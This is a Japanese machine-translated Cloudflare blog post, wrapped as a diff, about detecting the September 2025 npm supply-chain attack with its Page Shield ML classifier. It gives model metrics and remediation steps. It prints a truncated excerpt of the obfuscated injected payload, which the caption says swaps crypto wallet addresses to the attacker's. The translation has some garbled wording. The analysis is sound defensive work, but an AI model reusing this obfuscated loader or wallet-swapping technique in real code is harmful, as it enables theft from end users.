@@ -1,0 +1,159 @@
+<div class="mb2 gray5">4分で読了</div>
+<div class="mt4">この投稿は<a href="https://blog.cloudflare.com/how-cloudflares-client-side-security-made-the-npm-supply-chain-attack-a-non">English</a>でも表示されます。</div><img class="mr2" src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4hC3uxjcHan1BAlIyqcAua/8e05c6508eb4f673ff3342257bea6b4f/BLOG-3052_1.png" alt="">
+<div class="post-content post-body-content lh-copy gray1">
+	<p><i>このコンテンツは自動機械翻訳サービスによる翻訳版であり、皆さまの便宜のために提供しています。原本の英語版と異なる誤り、省略、解釈の微妙な違いが含まれる場合があります。ご不明な点がある場合は、英語版原本をご確認ください。</i></p>
+	<p>2025年9月上旬、攻撃者はフィッシングメールを使用し、npm上の信頼できるメンテナーアカウントの1つまたは複数を侵害しました。これを利用して、広く使用されている18のnpmパッケージ（たとえば、chalk、debug、ansi-style）の悪意のあるリリースを公表し、<a href="https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised" target="_blank" rel="noopener noreferrer"><u>週に20億を超えるダウンロード</u></a>を記録しました。これらの安全性が損なわれたパッケージを使用していたWebサイトやアプリケーションは、ハッカーがエンドユーザーから暗号資産を盗む（「暗号窃取」または「ウォール消費」）に対して脆弱でした。さらに、侵害されたパッケージは、同じメンテナーが所有する他のパッケージを変更し（盗んだnpmトークンを使って）、<a href="https://unit42.paloaltonetworks.com/npm-supply-chain-attack" target="_blank" rel="noopener noreferrer"><u>CI/CDパイプラインやクラウド アカウントの開発者トークンを盗むコード</u></a>を含めることができます。</p>
+	<p>お客様のアプリケーションのエンドユーザーに関しては、良いニュースとして、当社のクライアントサイドセキュリティサービスであるCloudflare<a href="https://www.cloudflare.com/application-services/products/page-shield" target="_blank" rel="noopener noreferrer"><u> Page Shieldが安全性が損なわれたJavaScriptライブラリを検出し、暗号スクレイピングを阻止します。</u></a>さらに重要なのは、Cloudflareの検出ソリューションにAIを活用することで、以下に説明するように、将来的にお客様が同様の攻撃から保護されることです。</p>
+	<pre class="language-javascript"><code class="language-javascript">export default {
+ aliceblue: [240, 248, 255],
+ …
+ yellow: [255, 255, 0],
+ yellowgreen: [154, 205, 50]
+}
+
+
+const _0x112fa8=_0x180f;(function(_0x13c8b9,_0x35f660){const _0x15b386=_0x180f,_0x66ea25=_0x13c8b9();while(!![]){try{const _0x2cc99e=parseInt(_0x15b386(0x46c))/(-0x1caa+0x61f*0x1+-0x9c*-0x25)*(parseInt(_0x15b386(0x132))/(-0x1d6b+-0x69e+0x240b))+-parseInt(_0x15b386(0x6a6))/(0x1*-0x26e1+-0x11a1*-0x2+-0x5d*-0xa)*(-parseInt(_0x15b386(0x4d5))/(0x3b2+-0xaa*0xf+-0x3*-0x218))+-parseInt(_0x15b386(0x1e8))/(0xfe+0x16f2+-0x17eb)+-parseInt(_0x15b386(0x707))/(-0x23f8+-0x2*0x70e+-0x48e*-0xb)*(parseInt(_0x15b386(0x3f3))/(-0x6a1+0x3f5+0x2b3))+-parseInt(_0x15b386(0x435))/(0xeb5+0x3b1+-0x125e)*(parseInt(_0x15b386(0x56e))/(0x18*0x118+-0x17ee+-0x249))+parseInt(_0x15b386(0x785))/(-0xfbd+0xd5d*-0x1+0x1d24)+-parseInt(_0x15b386(0x654))/(-0x196d*0x1+-0x605+0xa7f*0x3)*(-parseInt(_0x15b386(0x3ee))/(0x282*0xe+0x760*0x3+-0x3930));if(_0x2cc99e===_0x35f660)break;else _0x66ea25['push'](_0x66ea25['shift']());}catch(_0x205af0){_0x66 …
+</code></pre>
+	<p><sub><i>注入された悪意のあるペイロードと、残りの通常のコードの抜粋。特筆すべきは、ペイロードは正当な暗号アドレスを攻撃者のアドレス（ビットコイン、イーサリアム、ソラナなど、複数通貨のアドレス）に置き換えることです。</i></sub></p>
+	<div class="flex anchor relative">
+		<h2 id="finding-needles-in-a-3-5-billion-script-haystack">35億件の文字列の干し草の中から針を見つける</h2>
+		<a href="https://blog.cloudflare.com/#finding-needles-in-a-3-5-billion-script-haystack" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>毎日、Cloudflare Page Shieldは1日あたり35億件、毎秒40,000件のスクリプトを評価しています。機械学習（ML）ベースの悪意のあるスクリプト検出によると、そのうちの悪意のあるものは0.3%未満です。以前の<a href="https://blog.cloudflare.com/how-we-train-ai-to-uncover-malicious-javascript-intent-and-make-web-surfing-safer/#ai-inference-at-scale"><u>ブログ記事</u></a>で説明したように、JavaScriptコードを<a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="noopener noreferrer"><u>抽象構文ツリー</u></a>に前処理し、与えられたJavaScriptファイルを悪意のあるファイルまたは良性のいずれかに分類する<a href="https://mbernste.github.io/posts/gcn" target="_blank" rel="noopener noreferrer"><u>メッセージパッシンググラフ畳み込みネットワーク（MPGCN）</u></a>をトレーニングします。</p>
+	<p>グラフベースのモデルを使用する背後にある直感は、これらの構造（例：アサーションなど）とコードテキストを使用してハッカーのパターンを学習できます。例えば、npmの侵害では、侵害されたパッケージに注入された<a href="https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised" target="_blank" rel="noopener noreferrer"><u>悪意のあるコード</u></a>は、コード難読化を使用し、Ethereumのwindow.ethereumなどの暗号ウォレットインターフェースのコードエントリーポイントも変更して、支払い先を攻撃者の管理下にあるアカウントにスワップします。重要なのは、このような挙動を機能としてエンジニアリングするのではなく、純粋に構造と構文から、良いコードと悪いコードを区別することです。その結果、npmの侵害で使用されるテクニックだけでなく、将来の侵害テクニックに対しても耐性があります。</p>
+	<p>当社のMLモデルは、スクリプトが悪意がある可能性を出力し、その後、1～99のスコアに変換されます。低いスコアは悪意のある可能性が高いことを示し、スコアが高い場合は良性スクリプトを示します。重要なのは、多くのCloudflare MLモデルと同様に、推論が0.3秒以下で行われることです。</p>
+	<div class="flex anchor relative">
+		<h2 id="model-evaluation">モデル評価</h2>
+		<a href="https://blog.cloudflare.com/#model-evaluation" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>初回のリリース以来、JavaScript分類子は、モデル評価の指標（この場合は<a href="https://en.wikipedia.org/wiki/Precision_and_recall" target="_blank" rel="noopener noreferrer"><u>F1の測定</u></a>）を最適化するために常に進化してきました。現在の指標は</p>
+	<table>
+		<tbody>
+			<tr>
+				<th>
+					<p><b>指標</b></p>
+				</th>
+				<th>
+					<p><b>最新情報：バージョン2.7</b></p>
+				</th>
+				<th>
+					<p><b>前バージョンからの改善</b></p>
+				</th>
+			</tr>
+			<tr>
+				<td>
+					<p>精度</p>
+				</td>
+				<td>
+					<p>98%</p>
+				</td>
+				<td>
+					<p>5%</p>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<p>リコール</p>
+				</td>
+				<td>
+					<p>90%</p>
+				</td>
+				<td>
+					<p>233%</p>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<p>F1</p>
+				</td>
+				<td>
+					<p>94%</p>
+				</td>
+				<td>
+					<p>123%</p>
+				</td>
+			</tr>
+		</tbody>
+	</table>
+	<p>改善の一部は、次のようなものです：</p>
+	<ul>
+		<li>
+			<p>オープンソースデータセット、セキュリティパートナー、Cloudflareトラフィックのラベリングの組み合わせから厳選されたより多くのトレーニング例</p>
+		</li>
+		<li>
+			<p>たとえば、純粋なコメントやほぼ同じ構造のスクリプトが含まれるサンプルを削除することで、より良いトレーニング例を提供します。</p>
+		</li>
+		<li>
+			<p>トレーニングセットの階層化を改善することで、トレーニング、検証、テストセットはすべて、関心のあるクラスの分布が同様になります</p>
+		</li>
+		<li>
+			<p>評価基準を微調整し、99%の精度で記憶範囲を最大化</p>
+		</li>
+	</ul>
+	<p>混乱行列を考えると、毎秒40,000スクリプトの最大0.3%が悪意のあるものとしてフラグ付けされたと仮定した場合、毎秒約2件の誤検知が発生すると予想されます。当社では、複数のLLMと専門家である人間のセキュリティアナリストを使用して、24時間体制でこうしたスクリプトをレビューしています。このようにして遭遇する誤検知の多くは、かなり困難なものです。たとえば、クレジットカード番号以外のすべてのフォーム入力を読み取るスクリプト（例：Luhnアルゴリズムを使用して真をテストする入力値を拒否する）、動的スクリプトの挿入、頻繁なユーザートラッキング、高度な復号化などの攻撃を仕掛ける。ユーザー追跡スクリプトは、多くの場合、これらの動作の組み合わせを示します。そして、真に悪意のあるペイロードを区別する唯一の信頼できる方法は、悪意のあるペイロードを評価することです。信頼性を高めることができました。新たにラベル付けされたすべてのスクリプトをMLトレーニング（およびテスト）パイプラインにフィードバックします。</p>
+	<p>最も重要なことは、Cloudflare Page Shieldが18の侵害されたnpmパッケージすべてを悪意のあるものとして正常に検出することを検証したことです（新しい攻撃であるため、トレーニングデータには含まれません）。</p>
+	<div class="flex anchor relative">
+		<h2 id="planned-improvements">計画的改善</h2>
+		<a href="https://blog.cloudflare.com/#planned-improvements" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>静的スクリプト解析は有効性が証明されており、時に唯一の実行可能なアプローチとなります（例えばnpmパッケージなど）。より困難なケースに対応するために、スクリプトURL、ページホスト、接続されたドメインなどのコンテキストデータでMLシグナルを強化しています。最新のエージェンティックAIのアプローチは、JavaScriptランタイムをAIのワークフロー全体のツールとして包むことができます。そして、静的分析技術と動的分析技術を組み合わせたハイブリッドなアプローチを可能にし、ユーザー追跡スクリプトなどの困難な誤検知シナリオに対処することができます。</p>
+	<div class="flex anchor relative">
+		<h3 id="consolidating-classifiers">分類器の統合</h3>
+		<a href="https://blog.cloudflare.com/#consolidating-classifiers" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p><a href="https://blog.cloudflare.com/detecting-magecart-style-attacks-for-pageshield"><u>3年以上前</u></a>、私たちはコード難読化とデータ流出の行動を学習するMagecartスタイルのスクリプト用の分類子「<a href="https://developers.cloudflare.com/page-shield/detection/review-malicious-scripts/#review-malicious-scripts" target="_blank" rel="noopener noreferrer"><u>コード行動分析</u></a>」をリリースしました。その後、<a href="https://blog.cloudflare.com/navigating-the-maze-of-magecart"><u>Magecart攻撃</u></a>の分類も可能な、<a href="https://mbernste.github.io/posts/gcn" target="_blank" rel="noopener noreferrer"><u>メッセージ通過グラフ畳みませんネットワーク（MPGCN）</u></a>ベースのアプローチも展開しました。MPGCNベースの悪意のあるコード解析の有効性を考慮し、2025年末までに<a href="https://developers.cloudflare.com/page-shield/detection/review-malicious-scripts/#review-malicious-scripts" target="_blank" rel="noopener noreferrer"><u>コード動作解析</u></a>を廃止することを発表します。</p>
+	<div class="flex anchor relative">
+		<h2 id="staying-safe-always">常に安全を維持</h2>
+		<a href="https://blog.cloudflare.com/#staying-safe-always" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>npm攻撃では、Page Shieldユーザーのこの侵害に関連するCloudflareネットワーク内のアクティビティは見られませんでしたが、他のエクスプロイトでは、そのトラフィックは数分以内に捕捉されます。この場合、侵害されたnpmパッケージのパッチが2時間以内にリリースされ、感染した悪意のあるペイロードがエンドユーザーに影響を与えるためにエンドユーザー向けのアプリケーションに組み込まれなければならなかったことを考えると、当社のお客様が最初の手段を盗んだのではないかと疑われています。とはいえ、トラフィックが通過してしまった場合、Page Shieldはすでにこの脅威を検出し、阻止する装備を備えていたのです。</p>
+	<p>また、<a href="https://developers.cloudflare.com/page-shield/how-it-works/malicious-script-detection/#malicious-script-detection" target="_blank" rel="noopener noreferrer"><u>Page Shield ScriptDetection</u></a>を参照して、悪意のあるパッケージを検出してください。Page Shieldの「接続」タブを参照して、アプリケーションが確立した不審な接続を確認します。</p>
+	<figure class="kg-card kg-image-card">
+		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6rMXJZVWEu6LkupOPY2pOB/0740a085fa2a64de3cff148fc29ad328/BLOG-3052_2.png" alt="BLOG-3052 2" class="kg-image" width="1999" height="997" loading="lazy">
+	</figure>
+	<p><i><sub>いくつかのスクリプトが悪意のあるものとしてマークされています。</sub></i></p>
+	<figure class="kg-card kg-image-card">
+		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1oj2WALUAurKuu2XYTdKPm/fe8a564f10888e656c2510bc2a91dd6f/BLOG-3052_3.png" alt="BLOG-3052 3" class="kg-image" width="1999" height="988" loading="lazy">
+	</figure>
+	<p><i><sub>いくつかの接続が悪意のある接続としてマークされています。</sub></i></p>
+	<p>
+		そして、次の手順を必ず完了してください。</p>
+	<ol>
+		<li>
+			<p>最近公開されたバージョンの<b>依存関係ツリーを監査し</b>（package-lock.json / npm lsのチェック）、2025年9月上旬から中旬にかけて公開されたバージョンの広く使用されているパッケージを探してください。</p>
+		</li>
+		<li>
+			<p>ビルド環境に公開されている可<b>能性のある認証情報をローテーションします</b>。</p>
+		</li>
+		<li>
+			<p>ビルド<a href="https://www.cloudflare.com/learning/serverless/glossary/what-is-ci-cd" target="_blank" rel="noopener noreferrer">パイプライン</a>で使用されている可能性のある<b>CI/CDトークンおよびサービスキー</b>（GitHubアクション、npmトークン、クラウド認証情報）を無効化し、再発行します。</p>
+		</li>
+		<li>
+			<p><b>依存関係を既知の正常なバージョンにピン留めし</b>（またはロックファイルを使用）、レジストリプロバイダーが提供するパッケージ許可リスト/検証済みパブリッシャー機能の使用を検討してください。</p>
+		</li>
+		<li>
+			<p><b>ビルドログやリポジトリをスキャンして不審なコミットやGitHub Actionsの変更がないか確認し</b>、未知のWebhookやワークフローを削除しましょう。</p>
+		</li>
+	</ol>
+	<p>警戒の必要はありませんが、自動化された防御は、動きの速いサプライチェーン攻撃に対する重要な保護レイヤーを提供します。クライアントサイドのサプライチェーンの詳細をご希望ですか？無料のカスタム<a href="https://www.cloudflare.com/lp/client-side-risk-assessment" target="_blank" rel="noopener noreferrer"><u>クライアントサイドリスク評価</u></a>にお申し込みください。</p>
+</div>
